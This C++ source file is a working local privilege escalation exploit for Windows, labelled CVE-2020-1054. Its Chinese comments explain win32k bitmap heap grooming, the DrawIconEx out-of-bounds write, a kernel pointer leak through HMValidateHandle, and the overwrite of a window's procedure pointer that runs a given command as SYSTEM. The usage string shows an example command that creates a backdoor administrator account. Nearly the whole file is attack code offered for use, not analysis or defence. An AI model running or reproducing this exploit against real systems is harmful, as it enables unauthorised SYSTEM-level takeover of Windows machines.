#include <windows.h>
#include <stdio.h>
#include <Psapi.h>

extern "C" NTSTATUS  WndProc_fake(DWORD hWnd, DWORD msg, DWORD wParam, DWORD lParam);

typedef struct _HANDLEENTRY {
	PVOID   phead;
	PVOID   pOwner;
	BYTE    bType;
	BYTE    bFlags;
	WORD    wUniq;
} HANDLEENTRY, *PHANDLEENTRY;

typedef struct _SERVERINFO {
	WORD    wRIPFlags;
	WORD    wSRVIFlags;
	WORD    wRIPPID;
	WORD    wRIPError;
	ULONG   cHandleEntries;
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO  psi;
	PHANDLEENTRY aheList;
	ULONG        HeEntrySize;
} SHAREDINFO, *PSHAREDINFO;


typedef struct _LARGE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PVOID Buffer;
} LARGE_STRING, *PLARGE_STRING;

typedef struct _PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PVOID Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
} PEB, *PPEB;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _TEB
{
	NT_TIB NtTib;
	PVOID EnvironmentPointer;
	CLIENT_ID ClientId;
	PVOID ActiveRpcHandle;
	PVOID ThreadLocalStoragePointer;
	PPEB ProcessEnvironmentBlock;
	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	PVOID CsrClientThread;
	PVOID Win32ThreadInfo;
}TEB, *PTEB;


PBYTE pManagerObj = nullptr;
PBYTE pWorkerObj = nullptr;

HBITMAP hManager = 0;
HBITMAP hWorker = 0;

#ifdef _WIN64
typedef void*(NTAPI *lHMValidateHandle)(HANDLE h, int type);
#else
typedef void*(__fastcall *lHMValidateHandle)(HANDLE h, int type);
#endif

lHMValidateHandle pHmValidateHandle = NULL;

//获取HMValidateHandle的地址
//该函数并未在用户态中导出，不过有个用户态函数IsMenu调用了它，可以通过判断IsMenu中相关字节码的位置获取HMValidateHandle的地址。
BOOL FindHMValidateHandle() 
{
	//load user32
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) 
	{
		printf("Failed to load user32");
		return FALSE;
	}

	//Get IsMenu Api
	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) 
	{
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}

	unsigned int uiHMValidateHandleOffset = 0;
	// ismenu 的代码，这个程序很短，只有几行，其中只有一个call指令，就是HMValidateHandle 。call 的机器码就是0xe8
	//从0x77d46f0e 到 0x77d46f27 其中唯一的一个e8 就是call 指令。因此可以根据这个来找到HMValidateHandle 的地址，0xe8后面4个字节就是地址。
	for (unsigned int i = 0; i < 0x1000; i++) 
	{
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) 
		{
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) 
	{
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;

	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	//HmValidateHandle比较有意思，我们只需给它提供一个窗口句柄，然后它就会将在桌面堆中的tagWND对象指针返回回来，拿到该指针就相当于完成了内核信息泄露
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}





int main()
{
	//Entry
	int argc = 0;
	wchar_t **argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	puts("CVE-2020-1054-exploit");
	if (argc != 2)
	{
		printf("Usage: %S command\nExample: %S \"net user admin admin /ad & net user localgroup administrators admin /ad\"", argv[0], argv[0]);
		return -1;
	}
	system("pause");



	LoadLibrary(L"user32.dll");

	//exploit dc
	HDC exploit_dc = CreateCompatibleDC(0x0);


	PBYTE pExpBitmapObj = 0;//内核地址。我们将在该地址创建一个bitmap进行exploit

	//通过CreateComatibleBitmap对象来创建了一个BitMap对象用来触发漏洞。这里获取一个bitmap句柄
	//bitmap句柄的最后两个字节是该结构在GdiSharedHandleTable数组中的索引(=>handle & 0xffff)
	HBITMAP hExploitBit = CreateCompatibleBitmap(exploit_dc, 0x51500, 0x100);


	printf("[+]hExploitBit Handle address: %p\n", hExploitBit);

	//get teb
	PTEB Teb = NtCurrentTeb();

	//get peb
	PPEB Peb = Teb->ProcessEnvironmentBlock;
	if (Peb == NULL)
	{
		return FALSE;
	}

	printf("[+]Peb Pointer address : %p\n", Peb);//打印peb地址

	//kd> dt @$PEB nt!_PEB GdiSharedHandleTable 
	//+0x0f8 GdiSharedHandleTable 
	PBYTE  GdiSharedHandleTable = *(PBYTE *)((ULONGLONG)Peb + 0xF8);
	if (GdiSharedHandleTable == NULL)
	{
		return FALSE;
	}
	printf("[+]GdiSharedHandleTable Pointer address: %p\n", GdiSharedHandleTable);


	//获取 漏洞对象 内核地址
	//! 在之前版本的Win10中，可以通过一个特殊的结构GdiSharedHandleTable来获得Bitmap的内核对象地址。
	//这个GdiSharedHandleTable是PEB结构体中的一个结构。而里面存放的内容是一个GDICELL64结构。
	/*
	PEB中的该条目是一个指向GDICELL结构体数组的表 bitmap句柄的最后两个字节是该结构在GdiSharedHandleTable数组中的索引(=>handle & 0xffff)
	typedef struct GDICELL64
	{
	  PVOID64 pKernelAddress; // 0x00 pKernelAddress指向表项的BASEOBJECT头，后面跟随着一个特定的结构，这取决于它的wType。
	  USHORT wProcessId; // 0x08
	  USHORT wCount; // 0x0a
	  USHORT wUpper; // 0x0c
	  USHORT wType; // 0x0e
	  PVOID64 pUserAddress; // 0x10
	} GDICELL64; // sizeof = 0x18
	*/
	//? 在新版本Win10中，fix了这种方法，GdiSharedHandleTable获得的地址，不再是一个有效的pkernelAddress，
	//也就是说，即使我们通过这种方式和createbitmap的handle获得了一个地址，然而并不是真正的pkernelAddress，当然我们的主角pvScan0也不正确。
	//算对应GDICELL64地址的计算方法是：    base   +size*index
	//!?                               GdiSharedHandleTable +   sizeof(GDICELL64) * (handle & 0xffff)
	pExpBitmapObj = *(PBYTE *)((ULONGLONG)GdiSharedHandleTable + sizeof(HANDLEENTRY) * (((ULONGLONG)hExploitBit) & 0xffff));
	printf("[+]dwExpBitmapObj Lookup address: %p\n", pExpBitmapObj);


	//target address  oobtarget oobtarget不能随意控制，是基于ExpBitmap对象的一个偏移 这里偏移选取0x0000000100000000
	PBYTE oob_target =(PBYTE)((DWORD64)pExpBitmapObj & 0xfffffffffff00000) + 0x0000000100000000;
	printf("[+]oob_target  address: %p\n", oob_target);



	HDC alloc_dc = CreateCompatibleDC(0x0);
	DWORD64 extra_alloc = 0; //分配标志 0是分配hManger 1 是分配hWorker

	//为了成功创建用于利用的hManager和hWorker，需要通过喷射大量0x7000大小的BitMap对象
	//fengshui
	//offset 0                       hExploitBit 触发漏洞 扩大hManager所对应的BitMap对象的sizelBitmap来扩大hManager的可读写范围（BitmapObj->SurfObj.sizlBitmap）0x38
	//offset 0x100000000             oobtarget oobtarget不能随意控制，是基于ExpBitmap对象的一个偏移 
	//offset 0x100070000             hManager 通过hManager修改hWorker对应的BitMap对象的pvScan0，就可以实现任意地址读写实现提权
	//offset 0x100070038             hManager->BitmapObj->SurfObj.sizlBitmap 破坏改地址进行修改值
	//offset 0x100070000+0x7000      hWorker  进行提取
	while (true)
	{

		HBITMAP hBitMap = CreateCompatibleBitmap(alloc_dc, 0x6f000, 0x8);
		//pKernelAddress指向表项的BASEOBJECT头
		PBYTE pBitMapObj = *(PBYTE *)((ULONGLONG)GdiSharedHandleTable + sizeof(HANDLEENTRY) * (((ULONGLONG)hBitMap) & 0xffff));
		if (pBitMapObj == 0) 
		{
			printf("[-] Ran out of memory allocating Bitmaps");
			return 1;
		}

		//如果这个bitmap对象地址比target高且末尾是7000 则符合hManager的标准
		if ((pBitMapObj >= oob_target) && (((DWORD64)pBitMapObj & 0x0000000000070000) == 0x70000))
		{
			pManagerObj = pBitMapObj;//hManager对象指针
			hManager = hBitMap;//hManager 句柄

			printf("[+] Find hManager = %p\n", pManagerObj);
		}

		//hManager部署成功，开始部署hWorker
		if (pManagerObj > 0)
		{
			if (extra_alloc == 1)//分配hWorker
			{
				pWorkerObj = pBitMapObj;//hWorker对象指针
				hWorker = hBitMap;//hWorker句柄
				printf("[+] Find hWorker   = %p\n", pWorkerObj);
			}
		
			if (extra_alloc > 1)//fengshui分配结束 跳出while
			{
				break;
			}
			//extra_alloc=0进行循环分配第二个bitmap
			extra_alloc += 1;
		}
		
	};

	printf("[+] GetBitMapBits/Reading using oob_target...\n");

	//poc
	SelectObject(exploit_dc, hExploitBit);

	//0xfffffffffebffffc
	printf("TriggerExploit\n");
	//选用的偏移为0x100000000
    //通过这个偏移我我们可以求得DrawIconEx的各个参数（理论上不唯一）
	//!? oobTarget= pSurface->mySURFOBJ->pvScan0 + pStrrun->yPos* pSurface->mySURFOBJ->lDelta + 4 *(pStrrun->xrl->xPos >> 5);
	//! pSurface->mySURFOBJ->pvScan0=ExpBitmapObj+0x238
	//!? oobTarget= ExpBitmapObj+0x238 + pStrrun->yPos pSurface->mySURFOBJ->lDelta + 4 *(pStrrun->xrl->xPos >> 5);
	//? pStrrun->xrl->xPos的值比较简单，直接就是DrawIconEx arg2
	//? refpSurface->SurfObj.lDelta= cx / 8     cx为CreateCompatibleBitmap(exploit_dc, 0x51500, 0x100)中的第二个参数
	//!? oobTarget= ExpBitmapObj+0x238 + pStrrun->yPos * cx / 8 + 4 *(arg2 >> 5);
	
	//通过上述分析，我们可以做到对相对于漏洞内核对象偏移0x100000000+0x358处进行内存破坏,
	//!? 进而在最后一次循环破坏0x100000000+0x70038处内容
	DrawIconEx(exploit_dc, 0x900, 0xb, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, 0x0, 0x1);
	


	printf("Creating ExploitWnd\n");
	if (!FindHMValidateHandle()) //将在桌面堆中的tagWND对象指针返回回来
	{
		printf("[!] Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}

	//窗口类
	WNDCLASSEX wcx = {};
	wcx.cbSize = sizeof(WNDCLASSEX);
	wcx.lpfnWndProc = DefWindowProc;
	wcx.lpszClassName = L"hongye";
	RegisterClassEx(&wcx);
	//窗口
	HWND hExploitwnd = 
		CreateWindowEx(
		WS_EX_CLIENTEDGE, 
		L"hongye", L"hongye", 
			WS_OVERLAPPEDWINDOW, 
			CW_USEDEFAULT, 
			CW_USEDEFAULT, 
			240, 120, NULL, NULL, NULL, NULL);

	if (hExploitwnd == NULL)
	{
		printf("[!] CreateWindowEx error 0x%x!\n", GetLastError());
		return 3;
	}

	ULONG_PTR off_tagWND_pself = 0x20;//pSelf=pWnd+0x20，得到内核桌面堆地址、kernelTagCLS=pWnd+0xa8，得到内核TagCLS地址
	//! 调用HmValidateHandle将在桌面堆中的tagWND对象指针返回回来
	//! pIsMenu --> pHMValidateHandle --> pWnd = HMValidateHandle(hWnd,1)，返回tagWND对象指针，用户桌面堆地址 
	char* lpUserDesktopHeapWindow = (char*)pHmValidateHandle(hExploitwnd, 1);
	ULONG_PTR	tagWND = *(ULONG_PTR*)(lpUserDesktopHeapWindow + off_tagWND_pself);
	printf("[*] tagWND: 0x%p\n", tagWND);

	//pvScan0_64 = $pKernelAddress + 0x50
	//hExploitBit->pSurface->mySURFOBJ->pvScan0=ExpBitmapObj+0x238
	ULONG cb = (ULONG)(pWorkerObj + 0x50 - (pManagerObj + 0x238));//计算需要修改的距离
	//0x6fe18


	//ULONG cb = 0x6fe18;
	auto pvbits = malloc(cb);


	DWORD dwRet = 0;


	printf("hManager 0x%p\n", hManager);
	printf("hWorker  0x%p\n", hWorker);

	dwRet = GetBitmapBits(hManager, cb, pvbits);//读取
	printf("[!] GetBitmapBits error 0x%x!\n", GetLastError());

	         //handle  lpBits 参数指向的字节数 指向包含指定位图颜色数据的字节数组的指针。
	dwRet = SetBitmapBits(hManager, cb + sizeof(ULONG_PTR), pvbits);//写入

	//cbwndExtra成员在ttagWND+0x90处
	*(PULONG_PTR)((PBYTE)pvbits + cb) = (ULONG_PTR)tagWND + 0x90;
	SetBitmapBits(hManager, cb + sizeof(ULONG_PTR), pvbits);
	ULONG_PTR data = (ULONG_PTR)WndProc_fake;
	SetBitmapBits(hWorker, sizeof(ULONG_PTR), (void*)&data);
	SendMessage(hExploitwnd, WM_NULL, NULL, NULL);


	SECURITY_ATTRIBUTES		sa;
	HANDLE					hRead, hWrite;
	byte					buf[40960] = { 0 };
	STARTUPINFOW			si;
	PROCESS_INFORMATION		pi;
	DWORD					bytesRead;
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&sa, sizeof(sa));
	int br = 0;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return -3;
	}
	wprintf(L"[*] Trying to execute %s as SYSTEM\n", argv[1]);
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfoW(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.lpDesktop = L"WinSta0\\Default";
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	wchar_t cmd[4096] = { 0 };
	lstrcpyW(cmd, argv[1]);
	
	if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(hWrite);
		CloseHandle(hRead);
		printf("[!] CreateProcessW Failed![%lx]\n", GetLastError());
		return -2;
	}
	CloseHandle(hWrite);
	printf("[+] ProcessCreated with pid %d!\n", pi.dwProcessId);
	while (1)
	{
		if (!ReadFile(hRead, buf + br, 4000, &bytesRead, NULL))
			break;
		br += bytesRead;
	}
	puts("===============================");
	puts((char*)buf);
	fflush(stdout);
	fflush(stderr);
	CloseHandle(hRead);
	CloseHandle(pi.hProcess);
	ExitProcess(0);

	return 0;
}